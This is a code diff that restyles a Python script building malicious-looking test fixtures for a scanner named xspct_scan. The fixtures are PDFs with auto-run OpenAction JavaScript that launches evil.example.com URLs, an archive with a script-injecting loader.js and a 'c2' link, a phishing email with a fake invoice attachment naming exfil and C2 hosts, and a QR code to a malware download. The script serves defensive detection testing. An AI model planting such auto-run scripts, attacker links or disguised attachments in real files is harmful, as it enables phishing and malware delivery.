@@ -49,13 +49,13 @@ qr_code.png (optional)
     automatically skipped when it is absent.
 """
 
-import io
 import email.message
+import io
 import sys
 import zipfile
 from pathlib import Path
 
-FIXTURES = Path(__file__).parent / 'fixtures'
+FIXTURES = Path(__file__).parent / "fixtures"
 FIXTURES.mkdir(exist_ok=True)
 
 # ---------------------------------------------------------------------------
@@ -64,11 +64,11 @@ FIXTURES.mkdir(exist_ok=True)
 
 
 def _ok(path: Path) -> None:
-    print(f'  ✓  {path.name}')
+    print(f"  ✓  {path.name}")
 
 
 def _skip(name: str, reason: str) -> None:
-    print(f'  -  {name}  [{reason}]')
+    print(f"  -  {name}  [{reason}]")
 
 
 # ---------------------------------------------------------------------------
@@ -77,11 +77,11 @@ def _skip(name: str, reason: str) -> None:
 
 
 def make_pdfs() -> None:
-    print('\n--- PDF fixtures ---')
+    print("\n--- PDF fixtures ---")
     try:
         import fitz  # type: ignore[import-untyped]
     except ImportError:
-        _skip('pdf_*.pdf', 'PyMuPDF (fitz) not installed')
+        _skip("pdf_*.pdf", "PyMuPDF (fitz) not installed")
         return
 
     def _inject_openaction_js(doc, js_code: str) -> None:
@@ -92,32 +92,31 @@ def make_pdfs() -> None:
         """
         js_xref = doc.get_new_xref()
         # Escape inner quotes; keep it on a single PDF string line
-        safe = js_code.replace('\\', '\\\\').replace('(', '\\(').replace(')', '\\)')
+        safe = js_code.replace("\\", "\\\\").replace("(", "\\(").replace(")", "\\)")
         doc.update_object(
             js_xref,
-            f'<</Type /Action /S /JavaScript /JS ({safe})>>',
+            f"<</Type /Action /S /JavaScript /JS ({safe})>>",
         )
         cat_xref = doc.pdf_catalog()
-        cat_obj  = doc.xref_object(cat_xref)
+        cat_obj = doc.xref_object(cat_xref)
         # Insert /OpenAction reference before the closing >>
         cat_obj_new = (
-            cat_obj.rstrip().rstrip('>').rstrip()
-            + f'\n  /OpenAction {js_xref} 0 R\n>>'
+            cat_obj.rstrip().rstrip(">").rstrip() + f"\n  /OpenAction {js_xref} 0 R\n>>"
         )
         doc.update_object(cat_xref, cat_obj_new)
 
     # -- pdf_javascript.pdf ---------------------------------------------------
     doc = fitz.open()
     page = doc.new_page()
-    page.insert_text((50, 72), 'PDF with JavaScript — xspct_scan test fixture')
+    page.insert_text((50, 72), "PDF with JavaScript — xspct_scan test fixture")
     _inject_openaction_js(
         doc,
         'app.launchURL("https://evil.example.com/payload"); '
         'eval(unescape("%61%6c%65%72%74%281%29")); '
-        'var s = String.fromCharCode(104,116,116,112,115); '
+        "var s = String.fromCharCode(104,116,116,112,115); "
         'document.write("<b>injected</b>");',
     )
-    out = FIXTURES / 'pdf_javascript.pdf'
+    out = FIXTURES / "pdf_javascript.pdf"
     doc.save(str(out))
     doc.close()
     _ok(out)
@@ -125,16 +124,16 @@ def make_pdfs() -> None:
     # -- pdf_embedded.pdf -----------------------------------------------------
     doc = fitz.open()
     page = doc.new_page()
-    page.insert_text((50, 72), 'PDF with embedded file — xspct_scan test fixture')
+    page.insert_text((50, 72), "PDF with embedded file — xspct_scan test fixture")
     # embfile_add(name, buffer, filename, ufilename, desc)
     doc.embfile_add(
-        'payload',
-        b'malicious payload content\nhttps://exfil.example.com/steal\n',
-        filename='payload.txt',
-        ufilename='payload.txt',
-        desc='Embedded test payload',
+        "payload",
+        b"malicious payload content\nhttps://exfil.example.com/steal\n",
+        filename="payload.txt",
+        ufilename="payload.txt",
+        desc="Embedded test payload",
     )
-    out = FIXTURES / 'pdf_embedded.pdf'
+    out = FIXTURES / "pdf_embedded.pdf"
     doc.save(str(out))
     doc.close()
     _ok(out)
@@ -142,13 +141,15 @@ def make_pdfs() -> None:
     # -- pdf_uri.pdf ----------------------------------------------------------
     doc = fitz.open()
     page = doc.new_page()
-    page.insert_text((50, 72), 'PDF with external URI — xspct_scan test fixture')
-    page.insert_link({
-        'kind': fitz.LINK_URI,
-        'from': fitz.Rect(50, 100, 300, 120),
-        'uri': 'https://evil.example.com/openaction-uri',
-    })
-    out = FIXTURES / 'pdf_uri.pdf'
+    page.insert_text((50, 72), "PDF with external URI — xspct_scan test fixture")
+    page.insert_link(
+        {
+            "kind": fitz.LINK_URI,
+            "from": fitz.Rect(50, 100, 300, 120),
+            "uri": "https://evil.example.com/openaction-uri",
+        }
+    )
+    out = FIXTURES / "pdf_uri.pdf"
     doc.save(str(out))
     doc.close()
     _ok(out)
@@ -160,7 +161,7 @@ def make_pdfs() -> None:
 
 
 def make_html() -> None:
-    print('\n--- HTML fixture ---')
+    print("\n--- HTML fixture ---")
     html = """\
 <!DOCTYPE html>
 <html>
@@ -210,8 +211,8 @@ var payload = "sUu7bdfbASRXWkQR38MMyVrp/tSD1HidqAqcJ7r51gTieccxsYmp1bjY5oq6e15yw
 </body>
 </html>
 """
-    out = FIXTURES / 'html_phishing.html'
-    out.write_text(html, encoding='utf-8')
+    out = FIXTURES / "html_phishing.html"
+    out.write_text(html, encoding="utf-8")
     _ok(out)
 
 
@@ -221,59 +222,57 @@ var payload = "sUu7bdfbASRXWkQR38MMyVrp/tSD1HidqAqcJ7r51gTieccxsYmp1bjY5oq6e15yw
 
 
 def make_zip() -> None:
-    print('\n--- Archive fixture ---')
+    print("\n--- Archive fixture ---")
 
     # Nested PDF — use PyMuPDF if available, else raw bytes
     try:
         import fitz  # type: ignore[import-untyped]
+
         doc = fitz.open()
         page = doc.new_page()
-        page.insert_text((50, 72), 'Nested PDF inside archive — xspct_scan fixture')
+        page.insert_text((50, 72), "Nested PDF inside archive — xspct_scan fixture")
         # Inject JS via OpenAction using the same helper as make_pdfs()
         js_xref = doc.get_new_xref()
         doc.update_object(
             js_xref,
-            '<</Type /Action /S /JavaScript /JS '
+            "<</Type /Action /S /JavaScript /JS "
             '(eval("alert(1)"); app.launchURL("https://nested-pdf.example.com/c2"))>>',
         )
         cat_xref = doc.pdf_catalog()
-        cat_obj  = doc.xref_object(cat_xref)
+        cat_obj = doc.xref_object(cat_xref)
         cat_obj_new = (
-            cat_obj.rstrip().rstrip('>').rstrip()
-            + f'\n  /OpenAction {js_xref} 0 R\n>>'
+            cat_obj.rstrip().rstrip(">").rstrip() + f"\n  /OpenAction {js_xref} 0 R\n>>"
         )
         doc.update_object(cat_xref, cat_obj_new)
         pdf_bytes = doc.tobytes()
         doc.close()
     except ImportError:
         # Minimal syntactically-valid PDF with JS markers (byte-scan only)
-        pdf_bytes = (
-            b'%PDF-1.4\n'
-            b'/JS /JavaScript /OpenAction\n'
-            b'%%EOF\n'
-        )
+        pdf_bytes = b"%PDF-1.4\n/JS /JavaScript /OpenAction\n%%EOF\n"
 
     buf = io.BytesIO()
-    with zipfile.ZipFile(buf, 'w', compression=zipfile.ZIP_DEFLATED) as zf:
+    with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as zf:
         # Plain text with an IOC URL (triggers text member analysis + IOC extraction)
         zf.writestr(
-            'readme.txt',
-            'Test archive fixture for xspct_scan.\n'
-            'Suspicious URL: https://ioc-from-archive.example.com/path\n'
-            'Second IOC: https://another-ioc.example.com/stage2\n',
+            "readme.txt",
+            "Test archive fixture for xspct_scan.\n"
+            "Suspicious URL: https://ioc-from-archive.example.com/path\n"
+            "Second IOC: https://another-ioc.example.com/stage2\n",
         )
         # JavaScript file (triggers analyze_javascript via sync_analyze → text)
         zf.writestr(
-            'loader.js',
+            "loader.js",
             'eval(unescape("%61%6c%65%72%74%281%29"));\n'
             'document.write("<script src=https://cdn.evil.example.com/x.js></script>");\n',
         )
         # Nested PDF (triggers analyze_pdf on the member)
-        zf.writestr('invoice.pdf', pdf_bytes)
+        zf.writestr("invoice.pdf", pdf_bytes)
         # Sub-directory text file
-        zf.writestr('subdir/data.txt', 'sub-directory content\nhttps://subdir.example.com/\n')
+        zf.writestr(
+            "subdir/data.txt", "sub-directory content\nhttps://subdir.example.com/\n"
+        )
 
-    out = FIXTURES / 'archive_mixed.zip'
+    out = FIXTURES / "archive_mixed.zip"
     out.write_bytes(buf.getvalue())
     _ok(out)
 
@@ -284,33 +283,33 @@ def make_zip() -> None:
 
 
 def make_eml() -> None:
-    print('\n--- EML fixture ---')
+    print("\n--- EML fixture ---")
     msg = email.message.EmailMessage()
-    msg['From']    = 'attacker@evil.example.com'
-    msg['To']      = 'victim@company.example.com'
-    msg['Subject'] = 'Invoice Q1/2026 — please review'
-    msg['Message-ID'] = '<fixture-001@xspct-scan.test>'
+    msg["From"] = "attacker@evil.example.com"
+    msg["To"] = "victim@company.example.com"
+    msg["Subject"] = "Invoice Q1/2026 — please review"
+    msg["Message-ID"] = "<fixture-001@xspct-scan.test>"
     msg.set_content(
-        'Dear Sir/Madam,\n\n'
-        'Please find attached the invoice for Q1/2026.\n\n'
-        'Best regards\n\n'
-        'http://phishing.example.com/invoice-landing\n',
-        charset='utf-8',
+        "Dear Sir/Madam,\n\n"
+        "Please find attached the invoice for Q1/2026.\n\n"
+        "Best regards\n\n"
+        "http://phishing.example.com/invoice-landing\n",
+        charset="utf-8",
     )
     # Attachment: a plain-text "PDF" with suspicious content
     attachment = (
-        'This attachment simulates a malicious document.\n'
+        "This attachment simulates a malicious document.\n"
         'eval("shellcode");\n'
-        'https://malware.example.com/c2-beacon\n'
-        'https://exfil.example.com/data-upload\n'
-    ).encode('utf-8')
+        "https://malware.example.com/c2-beacon\n"
+        "https://exfil.example.com/data-upload\n"
+    ).encode("utf-8")
     msg.add_attachment(
         attachment,
-        maintype='application',
-        subtype='octet-stream',
-        filename='invoice.pdf',
+        maintype="application",
+        subtype="octet-stream",
+        filename="invoice.pdf",
     )
-    out = FIXTURES / 'email_with_attachment.eml'
+    out = FIXTURES / "email_with_attachment.eml"
     out.write_bytes(msg.as_bytes())
     _ok(out)
 
@@ -321,16 +320,17 @@ def make_eml() -> None:
 
 
 def make_qr() -> None:
-    print('\n--- QR code fixture ---')
-    url = 'https://qr-malware.example.com/download-payload'
+    print("\n--- QR code fixture ---")
+    url = "https://qr-malware.example.com/download-payload"
 
     # Try qrcode first
     try:
         import qrcode  # type: ignore[import-untyped]
+
         img = qrcode.make(url)
         buf = io.BytesIO()
-        img.save(buf, format='PNG')
-        out = FIXTURES / 'qr_code.png'
+        img.save(buf, format="PNG")
+        out = FIXTURES / "qr_code.png"
         out.write_bytes(buf.getvalue())
         _ok(out)
         return
@@ -340,17 +340,18 @@ def make_qr() -> None:
     # Fall back to segno
     try:
         import segno  # type: ignore[import-untyped]
+
         qr = segno.make(url)
         buf = io.BytesIO()
-        qr.save(buf, kind='png', scale=4)
-        out = FIXTURES / 'qr_code.png'
+        qr.save(buf, kind="png", scale=4)
+        out = FIXTURES / "qr_code.png"
         out.write_bytes(buf.getvalue())
         _ok(out)
         return
     except ImportError:
         pass
 
-    _skip('qr_code.png', 'neither qrcode nor segno is installed')
+    _skip("qr_code.png", "neither qrcode nor segno is installed")
 
 
 # ---------------------------------------------------------------------------
@@ -358,12 +359,12 @@ def make_qr() -> None:
 # ---------------------------------------------------------------------------
 
 
-if __name__ == '__main__':
-    print(f'Generating fixtures in {FIXTURES}')
+if __name__ == "__main__":
+    print(f"Generating fixtures in {FIXTURES}")
     make_pdfs()
     make_html()
     make_zip()
     make_eml()
     make_qr()
-    print('\nDone.')
+    print("\nDone.")
     sys.exit(0)
